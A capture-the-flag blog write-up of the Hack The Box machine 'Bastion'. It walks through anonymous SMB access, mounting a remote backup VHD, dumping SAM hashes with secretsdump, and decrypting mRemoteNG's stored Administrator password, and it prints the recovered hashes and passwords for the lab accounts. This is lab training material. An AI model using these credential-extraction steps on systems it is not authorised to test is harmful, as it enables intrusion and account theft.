---
title:     "Hack The Box - Bastion"
tags: [windows,easy,smb,vdh,mount,secretsdump]
layout: post
---


![746ea76ce09274229c8e9524524b0d5c.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bastion/3dbb37870b914ba29d4e84cb77e685ac.png)

We are going to pwn Bastion from Hack The Box.

Link: <https://www.hackthebox.eu/home/machines/profile/186>

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -38m03s, deviation: 1h09m16s, median: 1m55s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-04-20T15:08:39+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-20T13:08:43
|_  start_date: 2020-04-20T11:26:14
```

## SMB:

I tried running some nmap scripts on the smb port. But nothing interesting.

```
root@w0lf:~/CTF/HTB/Boxes/Bastion# smbclient -L 10.10.10.134
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```
We can see there is a `Backups` folder, Let's see what's inside.

I logged in without the password.
```
root@w0lf:~/CTF/HTB/Boxes/Bastion# smbclient //10.10.10.134/Backups/
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 20 18:55:26 2020
  ..                                  D        0  Mon Apr 20 18:55:26 2020
  botXYknWGw                          D        0  Mon Apr 20 17:09:23 2020
  nmap-test-file                      A      260  Mon Apr 20 18:55:26 2020
  note.txt                           AR      116  Tue Apr 16 15:40:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 18:13:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 18:14:02 2019

		7735807 blocks of size 4096. 2762689 blocks available
smb: \> 
```

`note.txt`
```
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

```
smb: \> cd WindowsImageBackup\
smb: \WindowsImageBackup\> ls
  .                                   D        0  Fri Feb 22 18:14:02 2019
  ..                                  D        0  Fri Feb 22 18:14:02 2019
  L4mpje-PC                           D        0  Fri Feb 22 18:15:32 2019

		7735807 blocks of size 4096. 2762689 blocks available
smb: \WindowsImageBackup\> cd L4mpje-PC\
smb: \WindowsImageBackup\L4mpje-PC\> ls
  .                                   D        0  Fri Feb 22 18:15:32 2019
  ..                                  D        0  Fri Feb 22 18:15:32 2019
  Backup 2019-02-22 124351            D        0  Fri Feb 22 18:15:32 2019
  Catalog                             D        0  Fri Feb 22 18:15:32 2019
  MediaId                             A       16  Fri Feb 22 18:14:02 2019
  SPPMetadataCache                    D        0  Fri Feb 22 18:15:32 2019

		7735807 blocks of size 4096. 2762689 blocks available
smb: \WindowsImageBackup\L4mpje-PC\> cd "Backup 2019-02-22 124351"
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls
  .                                   D        0  Fri Feb 22 18:15:32 2019
  ..                                  D        0  Fri Feb 22 18:15:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 18:14:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 18:15:32 2019
  BackupSpecs.xml                     A     1186  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml      A     1078  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml      A     8930  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml      A     6542  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml      A     2894  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml      A     1488  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml      A     1484  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml      A     3844  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml      A     3988  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml      A     7110  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml      A  2374620  Fri Feb 22 18:15:32 2019

		7735807 blocks of size 4096. 2762689 blocks available
```
There are some `vhd` files. VHD is a file format representing a virtual hard disk drive. And the files are pretty large. And the `note.txt` also told us don't transfer the backup file.

**Reference:** <https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25>

## Mounting the Backup Image:

It takes some time to mount.
```
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd# mount -t cifs //10.10.10.134/Backups/ ~/CTF/HTB/Boxes/Bastion/vhd -o rw
Password for root@//10.10.10.134/Backups/:  
```

We can finally access it.
```
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd# ls
botXYknWGw  nmap-test-file  note.txt  SDT65CB.tmp  WindowsImageBackup
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd# cd WindowsImageBackup/
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd/WindowsImageBackup# ls
L4mpje-PC
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd/WindowsImageBackup# cd L4mpje-PC/
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd/WindowsImageBackup/L4mpje-PC# ls
'Backup 2019-02-22 124351'   Catalog   MediaId   SPPMetadataCache
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd/WindowsImageBackup/L4mpje-PC# cd Backup\ 2019-02-22\ 124351/
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# ls
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd                                                      cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd                                                      cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
BackupSpecs.xml                                                                               cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml                                           cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml                                     cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
root@w0lf:~/CTF/HTB/Boxes/Bastion/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# 
```

Now it's time to mount them, before that make sure you have `libguestfs-tools` to mount virtual hard disk files on Linux.

```
root@w0lf:~/CTF/HTB/Boxes/Bastion/mount# guestmount --add ~/CTF/HTB/Boxes/Bastion/vhd/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro ~/CTF/HTB/Boxes/Bastion/mount/
root@w0lf:~/CTF/HTB/Boxes/Bastion/mount# ls
'$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows
root@w0lf:~/CTF/HTB/Boxes/Bastion/mount# 
```

Found an user, but no user flag.
```
root@w0lf:~/CTF/HTB/Boxes/Bastion/mount/Users# ls
'All Users'   Default  'Default User'   desktop.ini   L4mpje   Public
root@w0lf:~/CTF/HTB/Boxes/Bastion/mount/Users# 
```

But I can see the `SAM` file.
```
root@w0lf:~/CTF/HTB/Boxes/Bastion/mount/Windows/System32/config# ls -la SAM
-rwxrwxrwx 1 root root 262144 Feb 22  2019 SAM
```
>What is SAM (Security Account Manager)?
The Security Account Manager is a database file in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users' passwords. It can be used to authenticate local and remote users.

I used `secretsdump.py` to dump the hashes.
```
root@w0lf:~/CTF/HTB/Boxes/Bastion/mount/Windows/System32/config# secretsdump.py LOCAL -system SYSTEM -sam ./SAM
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up... 
```

I used [Crackstation](https://crackstation.net/) to crack these hashes.


![cfd937ac9b3bab774eb4c9f81e9454ce.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bastion/2de94a1d1dd44cdfb1bf6c1b652b333e.png)

We got user `L4mpje` password. Since we got SSH on the box I tried login in SSH using these creds. `l4mpje : bureaulampje`


![6d67e8021e35dd4f454b7cd8e00b4245.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bastion/05ab52147f044eccb55db13c86974e21.png)


## Privilege Escalation:

After some enumeration I found `mRemoteNG`:

![7ef00a7d0f27e8302c0608628ee68b80.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bastion/f1485f1b83664dfb9a56b70c822bc6df.png)


 > mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager. mRemoteNG adds bug fixes and new features to mRemote. It allows you to view all of your remote connections in a simple yet powerful tabbed interface. -mremoteng.org

> mRemoteNG saves the connections info and credentials in a file called confCons.xml.

**Reference:** <http://hackersvanguard.com/mremoteng-insecure-password-storage/>


I downloaded it with `scp` :
![eac448cb9bf41eb5acff5313705839b6.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bastion/ea7de3406f0e4bc1bae0418a1e5f100c.png)

The `XML` file contains Administrator hash.
```
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" 
```

I found a [Python script](https://github.com/haseebT/mRemoteNG-Decrypt) used to decrypt the password stored by mRemoteNG.
```
root@w0lf:~/CTF/HTB/Boxes/Bastion# python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

Logged in as **Administrator** via SSH


![80915571c2159afc24d95dbb32a77b67.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bastion/795a9fa9b0d84c9782f2ac09f0228b75.png)




























